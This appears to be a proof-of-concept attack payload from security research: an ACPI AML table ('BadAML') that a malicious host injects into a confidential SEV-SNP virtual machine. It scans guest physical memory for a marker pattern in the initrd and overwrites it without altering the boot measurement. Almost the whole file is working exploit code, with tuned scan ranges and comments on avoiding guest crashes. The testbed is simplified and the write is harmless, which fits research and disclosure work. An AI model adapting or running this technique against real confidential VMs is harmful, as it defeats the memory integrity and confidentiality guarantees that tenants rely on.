/*
    This is a BadAML attack payload that demonstrates AML access to confidential memory pages
    by writing to a file in the initrd, without changing the measurement.

    We do some simplifications in our setup to create a testbed for this attack (see badaml.nix):
    - Use an uncompressed initrd, so it can be modified directly and targeted.
    - Place a file with a known pattern (0xDEADBEEF repeated, 16MB) in the initrd, so we can
      find it by scanning guest physical memory without knowing the initrd start address.
    - To check the attack result, copy that file to /run after the AML execution so it can be checked
      in the final system.

    To mount the attack, we use a shell wrapper around QEMU that adds the malicious table via -acpitable flag.

    The AML code does the following:
    - Scans guest physical memory from 0x40000000 (1GB) in 8MB steps,
      looking for the 0xDEADBEEF pattern. Since the target file is 16MB,
      an 8MB step guarantees a hit.
    - Once found, scans backward to find the start of the pattern block.
    - Overwrites the first 4 bytes with 0xCAFEBABE.
*/

// Define an SSDT table. This is one of the tables that can contain AML code.
DefinitionBlock ("", "SSDT", 6, "BADAML", "BADAML", 0x20240306)
{
    Scope (\_SB)
    {
        Device (FAKE)
        {
            Name (_HID, "MSFT0003")

            // Read 4 bytes at address Arg0
            Method (RD32, 1, Serialized)
            {
                OperationRegion (RCHK, SystemMemory, Arg0, 4)
                Field (RCHK, DWordAcc, NoLock, Preserve)
                {
                    DVAL, 32
                }
                Return (DVAL)
            }

            // Coarse scan: starting at Arg0, take Arg1 steps of Arg2 bytes,
            // looking for pattern Arg3.
            // Uses an iteration count instead of an end address to avoid
            // 64-bit constants (DSDT revision may limit integers to 32 bits).
            // Checks 4 byte offsets at each position to handle unaligned initrd.
            // Returns address if found, 0 if not found.
            Method (CSCA, 4, Serialized)
            {
                Local0 = Arg0           // Current address
                Local1 = Arg1           // Iterations remaining

                While (Local1 > 0)
                {
                    // Check 4 byte offsets (0, 1, 2, 3) to handle misalignment
                    Local2 = 0
                    While (Local2 < 4)
                    {
                        If (RD32(Local0 + Local2) == Arg3)
                        {
                            Return (Local0 + Local2)
                        }
                        Local2 += 1
                    }
                    Local0 += Arg2
                    Local1 -= 1
                }

                Return (Zero)
            }

            // Fine scan backward from Arg0 to find start of pattern block.
            // Returns start address of contiguous pattern.
            Method (FSCN, 2, Serialized)
            {
                Local0 = Arg0

                While (One)
                {
                    Local1 = Local0 - 4
                    If (RD32(Local1) != Arg1)
                    {
                        Return (Local0)
                    }
                    Local0 = Local1
                }

                Return (Local0)
            }

            // Patch 4 bytes at Arg0 with value Arg1.
            // Returns original value.
            Method (PT32, 2, Serialized)
            {
                OperationRegion (TG32, SystemMemory, Arg0, 4)
                Field (TG32, DWordAcc, NoLock, Preserve)
                {
                    DWRD, 32
                }
                Local0 = DWRD
                DWRD = Arg1
                Return (Local0)
            }

            // The _INI method is automatically called on device initialization.
            Method (_INI, 0, Serialized)
            {
                Debug = "BADAML: _INI started"

                // Scan base: 0x40000000 (1GB). The initrd is loaded by OVMF
                // toward the upper end of guest RAM (empirically observed
                // around 0x8B000000 on our 2.4GB test VMs), so starting at
                // 1GB rather skips ~128 iterations that we know never contain
                // the target. Starting the scan further also mitigates against
                // unhandled #VC exit code 0x404 on SEV-SNP that were observed
                // to cause intermittent guest terminations.
                Local0 = 0x40000000

                Debug = "BADAML: coarse scanning memory for 0xdeadbeef"

                // Coarse scan: 170 steps of 8MB (0x800000) = ~1.33GB total.
                // Last scanned address is 0x40000000 + 169*0x800000 = 0x94800000,
                // which stays inside the primary usable-RAM block of our 2.4GB
                // VMs (it ends around 0x968eefff per e820). Reading past usable
                // RAM hits the ioremap path on SEV-SNP, which would corrupt the
                // private memory mapping - so we stop short of RAM end.
                // The deadbeef file is 16MB; we observe it loaded around
                // 0x8B000000, so this scan range still covers the hit.
                // Note: bytes DE AD BE EF read as little-endian DWORD = 0xEFBEADDE.
                Local2 = CSCA(Local0, 170, 0x800000, 0xEFBEADDE)

                If (Local2 != Zero)
                {
                    Debug = "BADAML: coarse hit, finding start of block"

                    // Fine scan backward to find start of the target file.
                    Local3 = FSCN(Local2, 0xEFBEADDE)

                    Debug = "BADAML: pattern block found, overwriting with 0xcafebabe"
                    // Patch the first 4 bytes of the target file.
                    // Again, little-endian so we write 0xBEBAFECA.
                    PT32(Local3, 0xBEBAFECA)
                }
                Else
                {
                    Debug = "BADAML: 0xdeadbeef not found in memory"
                }

                Debug = "BADAML: done"

                /* Padding */
                NoOp
            }
        }
    }
}
